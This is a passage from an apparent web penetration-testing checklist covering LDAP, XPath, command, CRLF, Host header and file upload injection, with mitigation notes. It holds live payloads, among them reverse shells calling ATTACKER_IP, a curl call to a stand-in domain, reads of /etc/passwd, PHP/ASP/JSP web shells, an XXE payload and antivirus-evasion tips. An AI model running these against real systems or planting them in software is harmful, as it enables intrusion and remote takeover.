    ### **5.** **Test for Error Messages**
    
    * **What to Look For**:
        
        * Errors revealing LDAP query structure:
            
            * `LDAP: error code 34 - invalid DN syntax`
            
            * `Error: unmatched parenthesis`
        
        * Inject payloads to trigger errors:
            
            * `)(`
            
            * `admin))`
            
            * `(objectClass=*)`
        
    
    * * *
    
    ### **6\.** **Retrieve Data via Injection**
    
    * **What to Do**:
        
        * Inject payloads to extract sensitive data:
            
            * `(cn=admin*)` (retrieve all admin users).
            
            * `(mail=*@example.com)` (retrieve all emails).
        
        * **Expected Outcome**:
            
            * Vulnerable: Query returns unauthorized data.
            
            * Secure: Query results are restricted to authorized users.
        
    
    * * *
    
    ### **7\.** **Test for Blind LDAP Injection**
    
    * **What to Do**:
        
        * Use time-based or Boolean-based techniques to infer results:
            
            * Boolean-based:
                
                * `(&(uid=validUser)(password=*))`
                
                * `(&(uid=invalidUser)(password=*))`
            
            * Time-based:
                * Inject payloads triggering delays:
                    * `username=validUser)(sleep(5))`
        
        * **Expected Outcome**:
            
            * Vulnerable: Server behavior changes based on payload.
            
            * Secure: Server behavior remains consistent.
        
    
    * * *
    
    ### **8\.** **Advanced Injection Techniques**
    
    * **Test for Nested Queries**:
        
        * Payloads:
            
            * `(&(uid=user1)(|(objectClass=*))`
            
            * `(&(uid=user1)(!(objectClass=*)))`
        
        * **Expected Outcome**:
            * Query results are altered based on nested conditions.
        
    
    * **LDAP Search Injection**:
        
        * Payloads:
            
            * `(uid=*))(|(uid=*))`
            
            * `(objectClass=*))(|(objectClass=*))`
        
        * Example:
            * Inject into search fields querying user directories.
        
    
    * * *
    
    ### **9\.** **Tools for LDAP Injection Testing**
    
    * **Manual Testing**:
        
        * Burp Suite Repeater for modifying requests.
        
        * Postman for API testing.
    
    * **Automated Tools**:
        
        * OWASP ZAP.
        
        * Nmap (LDAP NSE scripts):
            
                nmap --script ldap-search -p 389 <target>
                
            
        
        * LDAPSearch (command-line tool):
            
                ldapsearch -x -h <server> -b "dc=example,dc=com"
                
            
    
    * * *
    
    ### **Mitigation Testing**
    
    * **What to Verify**:
        
        * Input sanitization:
            * Ensure special characters like , `(`, `)` are escaped or rejected.
        
        * Parameterized queries:
            * Use secure APIs that automatically escape user input.
        
        * Limit query results:
            * Enforce strict filtering for query responses.
        
    
    * * *
    
    ### **Expected Outcomes**
    
    * **Secure**:
        
        * The application properly sanitizes input and escapes LDAP-specific characters.
        
        * Unauthorized access or data manipulation is blocked.
    
    * **Vulnerable**:
        * The application allows injection of unauthorized queries, bypassing access controls.
    

* **XPATH injection**
    
    ### **XPath Injection**
    
    **XPath Injection** vulnerabilities occur when user input is improperly sanitized and incorporated into XPath queries. This allows attackers to manipulate XML data queries to retrieve unauthorized data, bypass authentication, or perform other unauthorized actions.
    
    * * *
    
    ### **1\.** **Identify Input Points**
    
    * **Where to Test**:
        
        * Login forms using XML-based authentication.
        
        * Search fields querying XML documents.
        
        * API endpoints accepting XML input.
        
        * Web applications interacting with XML-based data stores.
        
    
    * * *
    
    ### **2\.** **Understand the Query Structure**
    
    * **Common XPath Query Syntax**:
        
            /users/user[username='inputUsername' and password='inputPassword']
            
        
        * Example:
            
            * Input: `username=user1` and `password=pass123`
            
            * Query:
                
                    /users/user[username='user1' and password='pass123']
                    
                
    
    * * *
    
    ### **3\.** **Test for Basic Injection**
    
    ### **a. Always-True Condition**
    
    * **What to Do**:
        
        * Inject always-true conditions to bypass authentication:
            
            * `' or '1'='1`
            
            * `username' or '1'='1`
        
        * **Example**:
            
                /users/user[username='' or '1'='1' and password='']
                
            
        
        * **Expected Outcome**:
            
            * Vulnerable: Authentication is bypassed.
            
            * Secure: Input is sanitized, and the query fails.
        
    
    * * *
    
    ### **4\.** **Test for Boolean-Based Conditions**
    
    ### **a. Valid and Invalid Inputs**
    
    * **What to Do**:
        
        * Use Boolean conditions to infer database behavior:
            
            * Valid condition: `username='user1' and '1'='1'`
            
            * Invalid condition: `username='user1' and '1'='2'`
        
        * Observe responses:
            * True conditions return data; false conditions do not.
        
    
    * * *
    
    ### **5\.** **Exploit Query Structure**
    
    ### **a. Inject Union Queries**
    
    * **What to Do**:
        
        * Inject union queries to combine data:
            * `username='admin' or username='guest'`
        
        * **Expected Outcome**:
            * The query returns multiple user records.
        
    
    ### **b. Retrieve Data**
    
    * **What to Do**:
        
        * Inject payloads to extract specific data:
            
            * `username='user1' and password!=''`
            
            * `username='admin' or starts-with(password, 'a')`
        
        * **Expected Outcome**:
            * Unauthorized data is disclosed.
        
    
    * * *
    
    ### **6\.** **Error-Based Testing**
    
    * **What to Do**:
        
        * Inject malformed queries to trigger errors:
            
            * `username='user1' and '`
            
            * `username=' or '1'='1' and '`
        
        * **Expected Outcome**:
            * Errors reveal XPath structure or sensitive information.
        
    
    * * *
    
    ### **7\.** **Blind XPath Injection**
    
    ### **a. Time-Based Techniques**
    
    * **What to Do**:
        
        * Use time delays to infer query results:
            * Example:
                
                    username='admin' and string-length(password)=6
                    
                
        
        * **Expected Outcome**:
            * Delayed responses indicate true conditions.
        
    
    ### **b. Character-by-Character Extraction**
    
    * **What to Do**:
        
        * Extract sensitive data by guessing characters:
            * Example:
                
                    username='admin' and substring(password,1,1)='a'
                    
                
        
        * Repeat until the full value is retrieved.
        
    
    * * *
    
    ### **8\.** **Test for XPath Injection in Search Fields**
    
    * **What to Do**:
        
        * Inject payloads to alter search queries:
            * Example:
                
                    /books/book[author='John' or '1'='1']
                    
                
        
        * **Expected Outcome**:
            * Unauthorized records are returned.
        
    
    * * *
    
    ### **9\.** **Tools for XPath Injection Testing**
    
    * **Manual Tools**:
        
        * Burp Suite (Repeater for payload testing).
        
        * Postman (for API requests).
    
    * **Automated Tools**:
        
        * OWASP ZAP.
        
        * Nuclei (XPath templates).
        
        * XSpear (for XPath-related vulnerabilities).
    
    * * *
    
    ### **10\.** **Mitigation Testing**
    
    * **What to Verify**:
        
        * Input sanitization:
            * Ensure special characters (`'`, `"`, `[`, `]`) are properly escaped.
        
        * Use parameterized queries:
            * Avoid dynamically constructing XPath queries with user input.
        
        * Restrict query results:
            * Limit the scope of data accessible via XPath.
        
    
    * * *
    
    ### **Expected Outcomes**
    
    * **Secure**:
        * The application properly sanitizes input, rejects malformed queries, and restricts unauthorized data access.
    
    * **Vulnerable**:
        * XPath queries are manipulated to retrieve unauthorized data or bypass access controls.
    

* **Command Injection**
    
    ### **Command Injection**
    
    **Command Injection vulnerabilities** occur when user-supplied input is executed as part of a system command on the server, potentially allowing attackers to execute arbitrary commands.
    
    * * *
    
    ### **1\.** **Identify Input Points**
    
    * **Where to Test**:
        
        * Input fields, query parameters, or headers used in system commands.
        
        * File upload fields (especially with filenames).
        
        * Shell execution functions in web applications:
            
            * PHP: `exec()`, `system()`, `shell_exec()`.
            
            * Python: `os.system()`, `subprocess.Popen`.
            
            * Node.js: `child_process.exec`.
        
    
    * * *
    
    ### **2\.** **Basic Injection Payloads**
    
    * Inject command separators:
        
        * Linux:
            * `;`, `&&`, `|`, `||`
        
        * Windows:
            * `&`, `&&`, `|`, `||`
        
    
    * **Examples**:
        
        * `; ls` (Linux)
        
        * `&& id` (Linux)
        
        * `| whoami` (Linux)
        
        * `& dir` (Windows)
        
    
    * * *
    
    ### **3\.** **Test with Input Fields**
    
    * Inject payloads into user-supplied inputs:
        
        * URL parameters: `http://example.com?cmd=ls`
        
        * Form fields: `name=John; ls`
        
        * HTTP headers: `User-Agent: Mozilla/5.0; id`
        
        * File names: `test.jpg; ls`
        
    
    * * *
    
    ### **4\.** **Chained Commands**
    
    * **What to Do**:
        
        * Inject payloads chaining multiple commands:
            
            * `; ls; whoami`
            
            * `&& id && uname -a`
        
        * **Expected Outcome**:
            * Multiple commands are executed.
        
    
    * * *
    
    ### **5\.** **Blind Command Injection**
    
    * **What to Do**:
        
        * Use time delay commands to test blind injection:
            
            * Linux:
                
                * `; sleep 5`
                
                * `&& ping -c 5 127.0.0.1`
            
            * Windows:
                * `; timeout 5`
        
        * **Expected Outcome**:
            * Delayed server response indicates command execution.
        
    
    * * *
    
    ### **6\.** **Bypass Input Validation**
    
    * **Encodings**:
        
        * URL encoding: `%3B`, `%26`, `%7C`
        
        * Double encoding: `%253B`, `%2526`
        
    
    * **Comments**:
        
        * Inject comments to bypass validation:
            
            * `; ls #`
            
            * `&& dir ::`
        
    
    * * *
    
    ### **7\.** **Advanced Payloads**
    
    ### **a.** **Command Substitution**
    
    * **Payloads**:
        
        * Linux:
            
            * `$(id)`
            
            * `` `id` ``
        
    
    * **Expected Outcome**:
        
        * Substituted commands are executed.
        
    
    ### **b.** **File Write/Read**
    
    * **Payloads**:
        
        * Write:
            * `; echo "hacked" > /tmp/hack.txt`
        
        * Read:
            * `; cat /etc/passwd`
        
        * **Expected Outcome**:
            * Files are modified or content is returned.
        
    
    ### **c.** **Reverse Shell**
    
    * **Payloads**:
        
        * Linux:
            
                ; bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
                
            
        
        * Python:
            
                ; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
                
            
        
    
    * **Expected Outcome**:
        
        * Server connects to your listener for a reverse shell.
        
    
    * * *
    
    ### **8\.** **Test for Error Messages**
    
    * **What to Look For**:
        
        * Errors revealing executed commands or their output:
            
            * `sh: command not found`
            
            * `Syntax error: unexpected token`
        
    
    * * *
    
    ### **9\.** **Test for Blind Injection**
    
    * Use external services (e.g., DNS or HTTP logs) to confirm execution:
        
        * Payloads:
            
            * `; curl http://YOUR_DOMAIN.com`
            
            * `; ping YOUR_DOMAIN`
        
    
    * Use a DNS logging service (e.g., Burp Collaborator).
        
    
    * * *
    
    ### **10\.** **Tools for Command Injection Testing**
    
    * **Manual**:
        
        * Burp Suite Repeater for injecting payloads.
        
        * Postman for API endpoints.
    
    * **Automated**:
        
        * OWASP ZAP.
        
        * Commix (Command Injection Exploiter).
        
        * Nuclei (Command Injection templates).
    
    * * *
    
    ### **Mitigation Testing**
    
    * Verify input sanitization:
        
        * Ensure special characters are escaped or stripped.
        
    
    * Use parameterized APIs:
        
        * Avoid directly including user inputs in system commands.
        
    
    * Limit command execution:
        
        * Use whitelisted commands and safe execution methods.
        
    
    * * *
    
    ### **Expected Outcomes**
    
    * **Secure**:
        * The server rejects command injection attempts and handles user inputs safely.
    
    * **Vulnerable**:
        * Server executes injected commands, returning outputs or affecting system behavior.
    

* **CRLF Injection**
    
    ### **CRLF Injection Testing Checklist**
    
    **CRLF Injection** (Carriage Return Line Feed) vulnerabilities occur when user input is improperly sanitized, allowing attackers to inject CR (`\r`) and LF (`\n`) characters into server responses, potentially leading to HTTP header manipulation, response splitting, or injection attacks.
    
    * * *
    
    ### **1\.** **Identify Input Points**
    
    * **Where to Test**:
        
        * URL parameters
        
        * HTTP headers (`User-Agent`, `Referer`, etc.)
        
        * Query strings
        
        * Form inputs
        
        * Cookies
        
        * API payloads
        
    
    * * *
    
    ### **2\.** **Basic Injection Test**
    
    * Inject `\r\n` characters into parameters and observe the response.
        
        * **Payloads**:
            
            * `%0d%0a` (URL-encoded CRLF)
            
            * `\r\n` (Literal CRLF)
            
            * `%0D%0A` (Case-insensitive encoding)
        
        * Example URL:`http://example.com?param=value%0d%0aHeader-Injected:Injected-Value`
        
    
    * * *
    
    ### **3.** **HTTP Header Injection**
    
    * **Where to Test**:
        
        * Applications that reflect user input into HTTP headers.
        
    
    * **What to Do**:
        
        * Inject CRLF sequences to manipulate headers:
            * `value%0d%0aX-Test-Header: test`
        
        * Observe for:
            
            * New headers added
            
            * Errors in the response
            
            * Changes in content type or caching behavior
        
        * Example Response:
            
                HTTP/1.1 200 OK
                Content-Type: text/html
                X-Test-Header: test
                
            
        
    
    * * *
    
    ### **4.** **HTTP Response Splitting**
    
    * **Where to Test**:
        
        * Applications constructing dynamic responses based on user input.
        
    
    * **What to Do**:
        
        * Inject CRLF to split the response:
            * Payload: `value%0d%0aContent-Length:0%0d%0a%0d%0a<script>alert('XSS')</script>`
        
        * Observe if:
            
            * A new HTTP response is injected.
            
            * The response contains attacker-controlled content.
        
    
    * * *
    
    ### **5\.** **Log Injection**
    
    * **Where to Test**:
        
        * Applications logging user input (e.g., `User-Agent`, `Referer`).
        
    
    * **What to Do**:
        
        * Inject payloads to manipulate log files:
            * `User-Agent: test%0d%0aInjected-Log:Success`
        
        * Check for:
            
            * New entries in server logs.
            
            * Application misbehavior due to log tampering.
        
    
    * * *
    
    ### **6\.** **Web Cache Poisoning**
    
    * **Where to Test**:
        
        * Applications using caching mechanisms (e.g., CDNs, reverse proxies).
        
    
    * **What to Do**:
        
        * Inject headers that influence caching:
            * `value%0d%0aCache-Control:no-store`
        
        * Observe if:
            
            * Cache entries are poisoned.
            
            * The application serves attacker-controlled content.
        
    
    * * *
    
    ### **7\.** **Cross-Site Scripting (XSS) via CRLF**
    
    * **Where to Test**:
        
        * Applications reflecting user input in HTTP headers or body.
        
    
    * **What to Do**:
        
        * Inject JavaScript payloads after CRLF:
            * `%0d%0aContent-Length:0%0d%0a%0d%0a<script>alert('XSS')</script>`
        
        * Observe if:
            * The script is executed in the client browser.
        
    
    * * *
    
    ### **8\.** **Authentication and Session Manipulation**
    
    * **Where to Test**:
        
        * Login forms, session cookies, or token headers.
        
    
    * **What to Do**:
        
        * Inject CRLF to bypass authentication mechanisms:
            * Payload: `%0d%0aSet-Cookie:auth_token=attacker_token`
        
        * Observe if:
            * The server accepts manipulated cookies or tokens.
        
    
    * * *
    
    ### **9\.** **Exploit Path**
    
    * Test for Open Redirects:
        
        * Inject payloads like `?redirect=%0d%0aLocation:evil.com` to manipulate redirection headers.
        
    
    * Modify `Content-Type`:
        
        * Inject: `%0d%0aContent-Type:application/json%0d%0a%0d%0a{"injected":"value"}`.
        
    
    * Alter `Content-Length`:
        
        * Payload: `%0d%0aContent-Length:0%0d%0a%0d%0aInjected Body`.
        
    
    * * *
    
    ### **10\.** **Tools for CRLF Injection**
    
    * **Manual**:
        
        * Burp Suite (Repeater to inject CRLF payloads).
        
        * Postman (Custom headers).
        
    
    * **Automated**:
        
        * OWASP ZAP.
        
        * CRLFuzz (Python-based tool for automating CRLF injection testing).
        
    
    * * *
    
    ### **Mitigation Testing**
    
    * Validate input sanitization:
        
        * Ensure all `\r\n` characters are properly escaped.
        
    
    * Test strict header formatting:
        
        * Verify that user inputs cannot modify HTTP headers.
        
    
    * Check for header injection protections in frameworks.
        
    
    * * *
    
    ### **Expected Outcomes**
    
    * **Secure**: The application rejects CRLF injection attempts, and headers or responses remain unaltered.
    
    * **Vulnerable**: Headers or responses are modified, allowing HTTP manipulation, XSS, or cache poisoning.
    

* **Host Header Injection**
    
    ### **Host Header Injection Testing Checklist**
    
    Host Header Injection vulnerabilities occur when the server trusts the `Host` header in an HTTP request without proper validation, potentially leading to redirection, cache poisoning, or bypassing access controls. Below is a comprehensive checklist to test for this vulnerability and additional scenarios you can explore once discovered.
    
    * * *
    
    ### **Host Header Injection Testing Checklist**
    
    ### **1\.** **Basic Tests**
    
    * **Where to Test**:
        
        * Any HTTP request with a `Host` header (e.g., web pages, APIs).
        
    
    * **What to Do**:
        
        * Modify the `Host` header to a malicious value:
            * Example: Replace `Host: example.com` with `Host: attacker.com`.
        
        * Observe server responses for anomalies (e.g., error pages, redirections).
        
    
    * * *
    
    ### **2\.** **Response Manipulation**
    
    * **Test for Error Message Disclosure**:
        
        * Use an invalid or unexpected value:
            * `Host: invalid.com`
        
        * Check for error messages revealing backend details.
        
    
    * **Test for Redirection**:
        
        * Set `Host` to an attacker-controlled domain:
            * `Host: evil.com`
        
        * Check if the server redirects users to the malicious domain.
        
    
    * * *
    
    ### **3\.** **Cache Poisoning**
    
    * **Where to Test**:
        
        * Applications using caching layers (e.g., CDNs, reverse proxies).
        
    
    * **What to Do**:
        
        * Modify the `Host` header to include an arbitrary domain:
            * `Host: cache-poison.com`
        
        * Check if the cache stores and serves the poisoned response to legitimate users.
        
    
    * * *
    
    ### **4\.** **Password Reset Poisoning**
    
    * **Where to Test**:
        
        * Password reset workflows that generate reset links in emails.
        
    
    * **What to Do**:
        
        * Modify the `Host` header during the password reset request:
            * `Host: attacker.com`
        
        * Check if the reset link in the email uses the injected host.
        
    
    * * *
    
    ### **5\.** **Bypass Access Controls**
    
    * **Where to Test**:
        
        * APIs or pages restricted to specific domains.
        
    
    * **What to Do**:
        
        * Set the `Host` header to the target domain:
            * `Host: admin.example.com`
        
        * Verify if the server grants unauthorized access.
        
    
    * * *
    
    ### **6\.** **Cross-Site Scripting (XSS) via Host Header**
    
    * **Where to Test**:
        
        * Applications reflecting the `Host` header in the response.
        
    
    * **What to Do**:
        
        * Inject malicious scripts into the `Host` header:
            * `Host: <script>alert('XSS')</script>`
        
        * Check if the script is executed in the response.
        
    
    * * *
    
    ### **7\.** **Server-Side Request Forgery (SSRF)**
    
    * **Where to Test**:
        
        * Applications making internal requests based on the `Host` header.
        
    
    * **What to Do**:
        
        * Set the `Host` header to an internal IP or endpoint:
            * `Host: 127.0.0.1`
        
        * Check if the application interacts with internal resources.
        
    
    * * *
    
    ### **8\.** **Open Redirect**
    
    * **Where to Test**:
        
        * Pages that use the `Host` header for redirections.
        
    
    * **What to Do**:
        
        * Modify the `Host` header to a malicious URL:
            * `Host: evil.com`
        
        * Check if the server redirects users to the malicious domain.
        
    
    * * *
    
    ### **9\.** **Subdomain Takeover Testing**
    
    * **Where to Test**:
        
        * Subdomains that might rely on the `Host` header for routing.
        
    
    * **What to Do**:
        
        * Replace the `Host` header with a subdomain or non-existent domain.
        
        * Verify if the server responds or leaks information.
        
    
    * * *
    
    ### **10\.** **CORS Misconfigurations**
    
    * **Where to Test**:
        
        * Applications using the `Host` header for CORS origin validation.
        
    
    * **What to Do**:
        
        * Inject arbitrary values into the `Host` header:
            * `Host: malicious.com`
        
        * Verify if the server allows cross-origin requests.
        
    
    * * *
    
    ### **What Else You Can Test if Host Header Injection is Found**
    
    1.  **Explore Password Reset Poisoning**
        * Generate password reset links pointing to a malicious domain to trick users.
    
    2.  **Cache Poisoning**
        * Poison the server cache to serve malicious content to legitimate users.
    
    3.  **Redirect Users**
        * Use the `Host` header to redirect users to a phishing site.
    
    4.  **XSS or Injection Attacks**
        * Leverage reflected `Host` header for XSS or other injections.
    
    5.  **SSRF Exploitation**
        * Test internal services and endpoints by manipulating the `Host` header.
    
    6.  **Access Control Bypass**
        * Gain access to restricted pages or APIs by modifying the `Host` header.
    
    7.  **Leak Information**
        * Observe responses for backend server details or misconfigurations.
    
    8.  **CORS Exploitation**
        * Abuse CORS misconfigurations to steal sensitive data.
    
    * * *
    

* **File Upload Vulnerability**
    
    * * *
    
    ### **File Upload Test Cases Checklist**
    
    ### **Functional Testing**
    
    * Verify if file upload functionality works as intended with valid file types and sizes.
        
    
    * Check if the file is correctly stored in the backend or database.
        
    
    * Validate if the uploaded file is accessible through the application.
        
    
    * Test if a confirmation message is displayed after successful upload.
        
    
    * * *
    
    ### **Input Validation**
    
    * Ensure the application allows only supported file types (e.g., `.jpg`, `.png`, `.pdf`).
        
    
    * Test by uploading unsupported file types (e.g., `.exe`, `.js`, `.php`).
        
    
    * Check if the file upload field rejects files exceeding the maximum allowed size.
        
    
    * Test for double file extensions (e.g., `image.jpg.php`).
        
    
    * * *
    
    ### **Malicious File Upload**
    
    * Test by uploading a web shell file:
        
            <?php echo shell_exec($_GET['cmd']); ?>
            
        
    
    * Check for execution of malicious files uploaded to the server.
        
    
    * Test by uploading a script disguised as an image (e.g., `image.jpg.php`).
        
    
    * Verify if the application allows uploading HTML or JavaScript files.
        
    
    * * *
    
    ### **MIME Type Validation**
    
    * Verify if the application validates file MIME types on the server side.
        
    
    * Test by modifying the MIME type in the request using tools like Burp Suite.
        
    
    * Upload a file with a mismatched extension and MIME type (e.g., `.jpg` file with `text/plain` MIME).
        
    
    * * *
    
    ### **File Name Validation**
    
    * Test by uploading a file with special characters in its name (e.g., `test<script>.jpg`).
        
    
    * Check if file names are sanitized to prevent path traversal or injection.
        
    
    * Verify the application handles very long file names without errors.
        
    
    * * *
    
    ### **Path Traversal**
    
    * Test for path traversal vulnerabilities:
        
        * Upload files with names like `../../../../etc/passwd`.
        
        * Inject directory traversal payloads into file names.
        
    
    * Verify if the file is saved in unintended directories.
        
    
    * * *
    
    ### **Content Validation**
    
    * Verify the application inspects file content and not just extensions.
        
    
    * Upload a valid file with malicious content embedded (e.g., malicious code hidden in metadata).
        
    
    * Check if the application parses or executes uploaded file contents.
        
    
    * * *
    
    ### **Security Testing**
    
    * Verify if uploaded files are stored in non-executable directories.
        
    
    * Test if the application enforces strict permissions on uploaded files.
        
    
    * Check for file overwrite by uploading a file with the same name as an existing file.
        
    
    * Test if the application prevents enumeration of uploaded files.
        
    
    * * *
    
    ### **Cross-Site Scripting (XSS)**
    
    * Test by uploading a file with malicious code in its name:
        
        * `<script>alert('XSS')</script>.jpg`
        
    
    * Verify if the file name is sanitized when displayed in the application.
        
    
    * * *
    
    ### **File Size and Limits**
    
    * Upload a file exceeding the maximum allowed size and verify the error message.
        
    
    * Test with very small files (e.g., 0-byte file) and check the application's response.
        
    
    * Verify how the application handles large concurrent file uploads.
        
    
    * * *
    
    ### **Error Handling**
    
    * Test the application‚Äôs response to invalid file uploads.
        
    
    * Verify if error messages reveal sensitive information about the server or file system.
        
    
    * Ensure the application provides clear and user-friendly error messages.
        
    
    * * *
    
    ### **Client-Side and Server-Side Validation**
    
    * Bypass client-side validation using developer tools and upload an unsupported file.
        
    
    * Verify if the server-side validation enforces file restrictions properly.
        
    
    * * *
    
    ### **Third-Party Integration**
    
    * Check if uploaded files are scanned by antivirus or malware detection tools.
        
    
    * Verify how the application handles integrations with third-party file storage services (e.g., AWS S3, Google Cloud).
        
    
    * * *
    
    ### **Performance Testing**
    
    * Upload multiple large files simultaneously to test server stability.
        
    
    * Test file upload functionality under slow network conditions.
        
    
    * * *
    
    ### **Payload Examples**
    
    * Malicious scripts:
        
            <?php echo shell_exec('whoami'); ?>
            
        
    
    * Path traversal: `../../../../etc/passwd`
    
    * XSS payloads: `<script>alert('XSS')</script>`
    
    * Large files: Generate files exceeding allowed size limits.
    
    * * *
    
    File Upload Bypass Techniques
    -----------------------------
    
    ### **File Upload Bypass Methods Checklist**
    
    ### **1\.** **Bypassing Extension Validation**
    
    * **Double Extension**: Upload files with extensions like `image.jpg.php` or `file.png.exe`.
        
    
    * **Uppercase Extensions**: Use extensions in uppercase (e.g., `SHELL.PHP`).
        
    
    * **Extensionless Files**: Upload files without extensions (e.g., `shell`).
        
    
    * **Valid Extension with Malicious Content**: Embed a malicious script in a file with a valid extension (e.g., `image.jpg` containing PHP code).
        
    
    * * *
    
    ### **2\.** **MIME Type Validation Bypass**
    
    * **Fake MIME Type**: Modify MIME type in the request (e.g., use `image/jpeg` for a `.php` file).
        
    
    * **Remove MIME Type**: Remove the `Content-Type` header and test the upload.
        
    
    * **Mismatched MIME Type**: Upload a file with a mismatched extension and MIME type (e.g., `.jpg` file with `text/plain` MIME).
        
    
    * * *
    
    ### **3\.** **Client-Side Validation Bypass**
    
    * **Disable JavaScript**: Turn off JavaScript to bypass client-side validation.
        
    
    * **Edit HTML**: Modify the file input field in the browser‚Äôs developer tools to accept disallowed file types.
        
    
    * **Intercept Request**: Use tools like Burp Suite to modify the file name or extension in transit.
        
    
    * * *
    
    ### **4\.** **Path Traversal**
    
    * **Directory Traversal**: Upload files with names like `../../../../etc/passwd` to check for improper file storage.
        
    
    * **UNC Path Uploads**: Test file paths like `\\evil-server\payload.php`.
        
    
    * * *
    
    ### **5\.** **Content Manipulation**
    
    * **Valid Extension with Malicious Content**: Upload a `.jpg` or `.png` file containing PHP or JavaScript code.
        
    
    * **Embed Payload in Metadata**: Insert malicious code in EXIF data of image files.
        
    
    * **Obfuscated Content**: Encode or obfuscate malicious payloads using Base64 or special characters.
        
    
    * * *
    
    ### **6\.** **Filename Tricks**
    
    * **Special Characters**: Use filenames with special characters (e.g., `<script>.jpg`, `test%00.php`).
        
    
    * **Spaces or Null Bytes**: Add spaces or null bytes to file names (e.g., `shell.php .jpg`, `shell.php%00.jpg`).
        
    
    * **Long File Names**: Test with extremely long file names to exploit potential validation issues.
        
    
    * * *
    
    ### **7\.** **Malicious Extensions**
    
    * **Uncommon Extensions**: Use extensions like `.phtml`, `.php5`, `.cer`, `.aspx`.
        
    
    * **Scriptable Extensions**: Upload files with extensions allowed to execute scripts (e.g., `.jhtml`, `.shtml`).
        
    
    * * *
    
    ### **8\.** **Oversized Files**
    
    * **Large Files**: Test with files exceeding the allowed size to test validation.
        
    
    * **Zero-Byte Files**: Upload empty files to check server handling.
        
    
    * * *
    
    ### **9\.** **Race Conditions**
    
    * **Simultaneous Uploads**: Attempt uploading files with the same name simultaneously.
        
    
    * **Access During Upload**: Try to access the file while it is being uploaded.
        
    
    * * *
    
    ### **10\.** **Antivirus/Scanner Evasion**
    
    * **Compress Files**: Use `.zip` or `.rar` to bypass antivirus scanning.
        
    
    * **Modify Payload**: Slightly alter malicious scripts to evade signature-based detection.
        
    
    * **Obfuscate Scripts**: Use obfuscation techniques (e.g., Unicode, escape sequences).
        
    
    * * *
    
    ### **11\.** **Server Misconfiguration**
    
    * **Executable Directories**: Test if uploaded files are saved in directories where execution is allowed.
        
    
    * **Permissions**: Check if uploaded files have executable permissions.
        
    
    * **Scriptable Formats**: Upload files with formats that allow embedded scripts (e.g., `.svg`, `.xml`).
        
    
    * * *
    
    ### **12\.** **Bypassing Whitelists**
    
    * **Unknown Extensions**: Test with uncommon extensions like `.txt`, `.csv`, `.html`.
        
    
    * **Tamper Whitelisted Extensions**: Use tampered extensions like `jpg;.php`.
        
    
    * * *
    

* **RCE via File Upload**
    
    ### **Checklist for File Upload RCE**
    
    ### **1\.** **Upload Malicious Script Files**
    
    * **What to Do**: Upload files containing server-side code that could execute commands.
    
    * **Where to Test**:
        
        * File upload fields
        
        * API endpoints accepting files
    
    * **Payloads**:
        
        * PHP:  
              
            Access via:  
            `http://example.com/uploads/shell.php?cmd=id`
            
                <?php system($_GET['cmd']); ?>
                
            
        
        * ASP:  
              
            Access via:  
            `http://example.com/uploads/shell.asp?cmd=dir`
            
                <% Execute(request("cmd")) %>
                
            
        
        * JSP:  
              
            Access via:  
            `http://example.com/uploads/shell.jsp?cmd=ls`
            
                <%= Runtime.getRuntime().exec(request.getParameter("cmd")) %>
                
            
    
    * * *
    
    ### **2\.** **Use Double Extension**
    
    * **What to Do**: Upload files with multiple extensions to bypass extension validation.
    
    * **Where to Test**:
        * Upload forms restricting file extensions.
    
    * **Payloads**:
        
        * `shell.php.jpg`
        
        * `payload.asp;.jpg`
        
        * `image.php%00.jpg`
    
    * **How to Confirm**:
        * Access the file directly: `http://example.com/uploads/shell.php`
    
    * * *
    
    ### **3\.** **Bypass MIME Type Validation**
    
    * **What to Do**: Modify the MIME type in the request headers.
    
    * **Where to Test**:
        * Upload forms restricting uploads by MIME type.
    
    * **Payloads**:
        * Change `Content-Type` to `image/jpeg` for a `.php` file.
    
    * **How to Confirm**:
        * If the file is uploaded, access it directly: `http://example.com/uploads/shell.php?cmd=id`
    
    * * *
    
    ### **4\.** **Exploit Upload Directory**
    
    * **What to Do**: Check if uploaded files are stored in directories that allow execution.
    
    * **Where to Test**:
        * Applications storing files in `/uploads/`, `/tmp/`, or `/public/`.
    
    * **Payloads**:
        * Any malicious script (e.g., `shell.php`).
    
    * **How to Confirm**:
        * Access the file URL and check if the script executes:  
              
            `http://example.com/uploads/shell.php?cmd=id`
    
    * * *
    
    ### **5\.** **Embed Payload in Allowed File Types**
    
    * **What to Do**: Inject code into files that are processed by the server.
    
    * **Where to Test**:
        
        * Image uploads
        
        * File types processed on the server (e.g., `.txt`, `.csv`, `.xml`).
    
    * **Payloads**:
        
        * **PHP in** `**.jpg**` **EXIF**:
            
                <?php system($_GET['cmd']); ?>
                
            
            * Embed using `ExifTool`:
                
                    exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
                    
                
        
        * **XML Payload**:
            
                <?xml version="1.0"?>
                <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
                <data>&xxe;</data>
                
            
    
    * **How to Confirm**:
        * Check if the uploaded file is parsed or executed.
    
    * * *
    
    ### **6\.** **Exploit Rare File Extensions**
    
    * **What to Do**: Use less commonly checked extensions that might be executable.
    
    * **Where to Test**:
        * Upload forms restricting to common file extensions.
    
    * **Payloads**:
        
        * `.phtml`, `.php5`, `.shtml`, `.cer`, `.aspx`
        
        * PHP Shell Example:
            
                <?php exec($_GET['cmd']); ?>
                
            
    
    * **How to Confirm**:
        * Access the file and execute commands: `http://example.com/uploads/shell.phtml?cmd=id`
    
    * * *
    
    ### **7\.** **Overwriting or Traversing File Paths**
    
    * **What to Do**: Use directory traversal to overwrite existing files or store files in unintended locations.
    
    * **Where to Test**:
        * Upload forms that allow custom file paths.
    
    * **Payloads**:
        * `../../../../var/www/html/shell.php`
    
    * **How to Confirm**:
        * Verify if the file is accessible and executable: `http://example.com/shell.php?cmd=id`
    
    * * *
    
    ### **8\.** **Exploit Server Misconfigurations**
    
    * **What to Do**: Test for improper file storage permissions or script execution in upload directories.
    
    * **Where to Test**:
        * Publicly accessible directories (e.g., `/uploads/`, `/tmp/`).
    
    * **Payloads**:
        
        * PHP Reverse Shell:
            
                <?php system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'"); ?>
                
            
        
        * Save the file as `shell.php` and upload.
    
    * **How to Confirm**:
